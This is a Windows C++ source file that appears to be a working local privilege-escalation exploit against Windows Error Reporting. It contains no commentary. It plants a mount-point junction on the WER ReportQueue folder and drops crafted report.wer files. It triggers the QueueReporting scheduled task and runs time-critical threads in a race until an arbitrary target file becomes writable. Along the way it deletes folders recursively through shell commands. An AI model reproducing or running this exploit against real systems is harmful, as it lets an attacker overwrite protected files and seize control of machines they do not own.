#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include "ReparsePoint.h"
#include <random>
#include "Resources.h"

extern int random;
extern int fileappend;
extern bool triggered;
extern bool secondthread;
extern wchar_t* target_file;

DWORD WINAPI MyThreadFunction2(LPVOID lpParam);
DWORD WINAPI MyThreadFunction(LPVOID lpParam);

wchar_t* GetTargetPath();

int CopyReport(wchar_t* outfilepath)
{
	unsigned long size = Report_wer_Size;
	void* data = Report_wer_Bytes;
	// Write data to outfilepath

	HANDLE hFile;
	DWORD dwBytesToWrite = (DWORD)size;
	DWORD dwBytesWritten = 0;
	BOOL bErrorFlag = FALSE;

	wprintf(outfilepath);
	printf("\n");

	hFile = CreateFile(outfilepath,                // name of the write
		GENERIC_WRITE,          // open for writing
		0,                      // do not share
		NULL,                   // default security
		CREATE_ALWAYS,             // create new file only
		FILE_ATTRIBUTE_NORMAL,  // normal file
		NULL);                  // no attr. template

	if (hFile == INVALID_HANDLE_VALUE)
	{
		return 1;
	}


	bErrorFlag = WriteFile(
		hFile,           // open file handle
		data,      // start of data to write
		dwBytesToWrite,  // number of bytes to write
		&dwBytesWritten, // number of bytes that were written
		NULL);            // no overlapped structure

	if (FALSE == bErrorFlag)
	{
		return 1;
	}
	else
	{
		if (dwBytesWritten != dwBytesToWrite)
		{
			// This is an error because a synchronous write that results in
			// success (WriteFile returns TRUE) should write all data as
			// requested. This would not necessarily be the case for
			// asynchronous writes.
			return 1;
		}
		else
		{
			//_tprintf(TEXT("Wrote %d bytes to %s successfully.\n"), dwBytesWritten, argv[1]);
		}
	}

	CloseHandle(hFile);

	return 0;
}

int WriteDacl(wchar_t* outfilepath)
{
	target_file = outfilepath;

	HANDLE hDir = CreateFileW(L"c:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue", GENERIC_WRITE, FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS | FILE_FLAG_OPEN_REPARSE_POINT, NULL);
	system("RMDIR \"c:\\halb\" / S / Q");
	CreateDirectory(L"c:\\halb", NULL);
	ReparsePoint::CreateMountPoint(hDir, L"C:\\halb", L"");
	Sleep(2000);
	HANDLE testhandle;
	int ClearTimer = 0;
	do {
		////////////////////////////////////////Clean-up routine/////////////////////////////////////////////////
		ClearTimer++;
		if (ClearTimer == 50)
		{
			Sleep(5000);
			CopyReport((wchar_t*)L"c:\\halb\\7_7_7_7_7\\report.wer");
			CopyReport((wchar_t*)L"c:\\halb\\8_8_8_8_8\\report.wer");
			system("SCHTASKS /Run /Tn \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
			Sleep(15000);
			system("RMDIR \"c:\\halb\\7_7_7_7_7\" /S /Q");
			system("RMDIR \"c:\\halb\\8_8_8_8_8\" /S /Q");
			ClearTimer = 0;
		}
		/////////////////////////////////////////////////////////////////////////////////////////////////////

		fileappend--;
		std::random_device rd;
		std::mt19937 gen(rd());
		std::uniform_int_distribution<> dis(10000, 70000);
		random = dis(gen);
		std::wstring path = L"c:\\halb\\7_7_7_7_7\\icles";
		path += std::to_wstring(fileappend);
		const wchar_t* blah = path.c_str();
		CreateDirectory(L"c:\\halb", NULL);
		triggered = false;
		CreateDirectory(L"c:\\halb\\8_8_8_8_8", NULL);
		CreateDirectory(L"c:\\halb\\7_7_7_7_7", NULL);
		HANDLE ew = CreateFile(blah, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
		CloseHandle(ew);
		CopyReport((wchar_t*)L"c:\\halb\\7_7_7_7_7\\report.wer");
		HANDLE mThread = CreateThread(NULL, 0, MyThreadFunction, NULL, 0, NULL);
		SetThreadPriority(mThread, THREAD_PRIORITY_TIME_CRITICAL);
		LARGE_INTEGER li;
		while (secondthread == false)
		{
			QueryPerformanceCounter(&li);
		}
		HANDLE mThread2 = CreateThread(NULL, 0, MyThreadFunction2, NULL, 0, NULL);
		secondthread = false;
		SetThreadPriority(mThread2, THREAD_PRIORITY_TIME_CRITICAL);
		system("SCHTASKS /Run /Tn \"Microsoft\\Windows\\Windows Error Reporting\\QueueReporting\"");
		int count = 0;
		while (triggered == false)
		{
			count++;
			if (count > 5000)
			{
				break;
			}
			Sleep(1);
		}
		//May need to increase this on slower computers..
		Sleep(500);
		testhandle = CreateFile(target_file, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		TerminateThread(mThread, 0);
		TerminateThread(mThread2, 0);
	} while (testhandle == INVALID_HANDLE_VALUE);

	CloseHandle(testhandle);

	return 0;
}

void Exploit()
{
	WriteDacl(GetTargetPath());
}